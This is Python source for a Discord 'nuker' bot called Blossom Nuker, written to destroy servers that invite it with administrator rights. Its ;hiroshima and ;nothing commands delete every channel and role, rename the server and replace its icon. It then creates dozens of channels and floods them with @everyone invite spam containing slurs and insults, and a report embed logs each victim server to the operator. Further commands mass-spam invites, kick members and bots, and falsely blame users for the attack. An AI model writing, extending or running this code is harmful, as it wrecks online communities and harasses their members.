import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

# ============================================================
#  INTENTS
# ============================================================
intents = discord.Intents.all()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True

client = commands.Bot(command_prefix=";", intents=intents, help_command=None)

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559
whitelisted_servers = set()

# ============================================================
#  RATE LIMIT TRACKER
# ============================================================
class RateLimiter:
    def __init__(self, max_requests_per_second=15):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.1
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=15)

# ============================================================
#  ULTRA FAST CHANNEL CREATION
# ============================================================
async def create_channels_fast(guild, count=80, name="Fucked By blossom."):
    """Create channels at maximum speed using parallel batches."""
    channels = []
    created = 0
    failed = 0
    
    batch_size = 8
    delay_between_batches = 0.6
    
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        tasks = []
        
        for j in range(batch_count):
            task = asyncio.create_task(guild.create_text_channel(name))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.TextChannel):
                channels.append(r)
                created += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                retry_after = float(r.response.headers.get('Retry-After', 2))
                print(f"[RATE LIMIT] Waiting {retry_after}s...")
                await asyncio.sleep(retry_after + 0.5)
                for j in range(batch_count):
                    try:
                        ch = await guild.create_text_channel(name)
                        channels.append(ch)
                        created += 1
                    except:
                        failed += 1
            elif isinstance(r, Exception):
                failed += 1
                print(f"[ERROR] {r}")
        
        print(f"[CREATE] Created {created}/{count} channels")
        
        if i + batch_count < count:
            await asyncio.sleep(delay_between_batches)
    
    print(f"[CREATE] Done: {created} created, {failed} failed")
    return channels

# ============================================================
#  ULTRA FAST SPAM
# ============================================================
async def spam_channel_fast(channel, message, amount):
    """Spam a single channel as fast as possible."""
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent = 0
    batch_size = 5
    
    for i in range(0, min(amount, 200), batch_size):
        batch_count = min(batch_size, amount - i)
        tasks = []
        
        for j in range(batch_count):
            task = asyncio.create_task(channel.send(message))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.Message):
                sent += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                retry_after = float(r.response.headers.get('Retry-After', 1))
                await asyncio.sleep(retry_after + 0.3)
                try:
                    await channel.send(message)
                    sent += 1
                except:
                    pass
        
        await asyncio.sleep(0.05)
    
    return sent

async def send_invite_spam(channels, amount=30):
    """Spam all channels in parallel."""
    if not channels:
        return 0
    
    total_sent = 0
    tasks = []
    
    for channel in channels:
        task = asyncio.create_task(spam_channel_fast(channel, SPAM_MESSAGE, amount))
        tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for r in results:
        if isinstance(r, int):
            total_sent += r
    
    print(f"[SPAM] Total sent: {total_sent} messages")
    return total_sent

# ============================================================
#  RAID SLASH COMMAND — CHANNEL-ONLY SPAM
# ============================================================
class RaidRateLimiter:
    def __init__(self, max_requests_per_second=20):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.05
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

raid_limiter = RaidRateLimiter(max_requests_per_second=20)

async def raid_spam_channel(channel, message, amount=50):
    """Spam a single channel with the invite link."""
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent = 0
    batch_size = 5
    
    for i in range(0, min(amount, 150), batch_size):
        batch_count = min(batch_size, amount - i)
        tasks = []
        
        for _ in range(batch_count):
            tasks.append(asyncio.create_task(channel.send(message)))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.Message):
                sent += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                retry_after = float(r.response.headers.get('Retry-After', 1))
                await asyncio.sleep(retry_after + 0.3)
                try:
                    await channel.send(message)
                    sent += 1
                except:
                    pass
        
        await asyncio.sleep(0.05)
    
    return sent

@client.tree.command(name="raid", description="Spam the Blossom invite link in this channel (fast!)")
async def raid(interaction: discord.Interaction):
    """Slash command to spam the invite link in the current channel only."""
    
    await interaction.response.defer(ephemeral=False)
    
    if not interaction.guild:
        await interaction.followup.send("❌ This command only works in a server.", ephemeral=True)
        return
    
    # Check if the bot can send messages in this channel
    if not interaction.channel.permissions_for(interaction.guild.me).send_messages:
        await interaction.followup.send("❌ I don't have permission to send messages in this channel.", ephemeral=True)
        return
    
    # The invite message
    invite_message = "@everyone **JOIN BLOSSOM EMPIRE** — discord.gg/Gx9b3AsJR3"
    
    # Send starting message
    await interaction.followup.send(f"💥 **RAID STARTED** — Spamming this channel...")
    
    # Spam the channel
    sent = await raid_spam_channel(interaction.channel, invite_message, amount=50)
    
    # Send completion message
    await interaction.followup.send(
        f"✅ **RAID COMPLETE** — Sent {sent} invite messages in this channel!\n"
        f"🔥 Join the chaos: discord.gg/Gx9b3AsJR3"
    )
    
    print(f"[RAID] {interaction.user} raided #{interaction.channel.name} in {interaction.guild.name} — {sent} messages sent")

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
    print(f"{Fore.GREEN}[+] Guilds: {len(client.guilds)}")
    
    # Sync slash commands
    try:
        synced = await client.tree.sync()
        print(f"{Fore.GREEN}[+] Synced {len(synced)} slash commands.")
        for cmd in synced:
            print(f"    /{cmd.name} — {cmd.description}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to sync slash commands: {e}")

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# ============================================================
#  COMMANDS
# ============================================================
@client.command(name="hiroshima")
async def hiroshima(ctx):
    """Nuke the server."""
    if not ctx.guild:
        await ctx.send("This command only works in a server.")
        return
    
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ I need Administrator permissions to nuke!")
        return
    
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild
    print(f"[START] Hiroshima on {guild.name} ({guild.id}) by {ctx.author}")

    # --- CHANGE SERVER NAME & ICON ---
    try:
        if ctx.guild.me.guild_permissions.manage_guild:
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed")
            
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await guild.edit(icon=image_data)
                        print("[SUCCESS] Server icon changed")
        else:
            print("[ERROR] Missing manage_guild permission")
    except Exception as e:
        print(f"[ERROR] Server rename/icon: {e}")

    # --- REPORT CHANNEL ---
    try:
        report_channel = client.get_channel(REPORT_CHANNEL_ID)
        if report_channel:
            embed = discord.Embed(
                title="Hiroshima command used",
                description=f"A server has been targeted.",
                color=discord.Color.red()
            )
            embed.add_field(name="Server name", value=guild.name, inline=False)
            embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
            embed.add_field(name="Server ID", value=str(guild.id), inline=False)
            embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            embed.set_footer(text="Blossom Nuker report")
            await report_channel.send(embed=embed)
    except Exception as e:
        print(f"[ERROR] Report: {e}")

    # --- DELETE CHANNELS ---
    print("[DELETE] Deleting all channels...")
    delete_tasks = []
    for channel in list(guild.channels):
        delete_tasks.append(asyncio.create_task(channel.delete()))
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"[DELETE] Deleted {len(delete_tasks)} channels")

    # --- DELETE ROLES ---
    print("[DELETE] Deleting all roles...")
    delete_tasks = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_tasks.append(asyncio.create_task(role.delete()))
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"[DELETE] Deleted {len(delete_tasks)} roles")

    # --- CREATE CHANNELS ---
    print("[CREATE] Creating 80 channels at max speed...")
    channels = await create_channels_fast(guild, count=80, name="Fucked By blossom.")

    # --- SPAM ---
    if channels:
        print(f"[SPAM] Spamming {len(channels)} channels...")
        await send_invite_spam(channels, amount=40)
    else:
        existing = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if existing:
            print(f"[SPAM] Using {len(existing)} existing channels")
            await send_invite_spam(existing, amount=40)

    print(f"[COMPLETE] Hiroshima finished on {guild.name}")
    await ctx.send("💥 Nuke complete! Check the carnage.")

@client.command(name="spaminvite")
async def spaminvite(ctx, amount: int = 25):
    """Spam the invite link across all visible text channels."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming...")
    await send_invite_spam(channels, amount=amount)
    await ctx.send("Finished.")

@client.command(name="kicka")
async def kicka(ctx, member: discord.Member = None):
    """Kick a specific member, or all bots if no member specified."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return

    if member is not None:
        if member == ctx.author:
            await ctx.send("❌ You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("❌ You can't kick someone with a higher or equal role.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author}")
            await ctx.send(f"✅ Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")
        return

    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the `Kick Members` permission.")
        return

    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author}")
            kicked += 1
        except Exception:
            failed += 1
    await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")

@client.command(name="blame")
async def blame(ctx, member: discord.Member = None):
    """Accuse a user of nuking the server."""
    target = member or ctx.author
    reasons = ["thanks for nuking nigga!"] * 5
    reason = random.choice(reasons)
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command(name="help")
async def help_command(ctx):
    """Display help menu."""
    embed = discord.Embed(
        title="🌸 Blossom Nuker Commands",
        description="Here are all the available commands:",
        color=discord.Color.magenta()
    )
    embed.add_field(name=";hiroshima", value="Nuke the server (delete channels/roles, create new ones, spam)", inline=False)
    embed.add_field(name=";spaminvite [amount]", value="Spam the invite link X times per channel", inline=False)
    embed.add_field(name=";kicka [@user]", value="Kick a specific user or all bots", inline=False)
    embed.add_field(name=";blame @user", value="Accuse someone of nuking", inline=False)
    embed.add_field(name=";nothing", value="Delete everything (no spam)", inline=False)
    embed.add_field(name=";credits", value="Show bot credits", inline=False)
    embed.add_field(name=";getbot", value="Get the invite link for this bot", inline=False)
    embed.add_field(name=";whitelist", value="Whitelist a server (owner only)", inline=False)
    embed.add_field(name="/raid", value="Slash command — spam invite in THIS channel only", inline=False)
    embed.set_footer(text="Blossom Nuker — chaos engine")
    await ctx.send(embed=embed)

@client.command(name="credits")
async def credits(ctx):
    """Show bot credits."""
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command(name="getbot")
async def getbot(ctx):
    """Send a pre-built OAuth2 invite link for this bot."""
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

@client.command(name="whitelist")
async def whitelist(ctx, action: str, guild_id: int = None):
    """Whitelist a server to prevent nuking."""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Restricted to bot owner.")
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` whitelisted.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command(name="nothing")
async def nothing(ctx):
    """Delete everything in the server (no spam)."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    
    await ctx.send("💀 Deleting everything...")
    guild = ctx.guild
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass
    
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    await ctx.send("✅ Everything deleted!")

# ============================================================
#  ERROR HANDLER
# ============================================================
@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Command not found. Use `;help` to see available commands.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(f"❌ You don't have permission to use this command.")
    elif isinstance(error, commands.BotMissingPermissions):
        await ctx.send(f"❌ I don't have permission to do that. Missing: {error.missing_permissions}")
    else:
        print(f"[ERROR] {error}")
        await ctx.send(f"❌ An error occurred: {str(error)[:100]}")

# ============================================================
#  RUN
# ============================================================
if __name__ == "__main__":
    try:
        print(f"{Fore.GREEN}[+] Starting Blossom Nuker...")
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
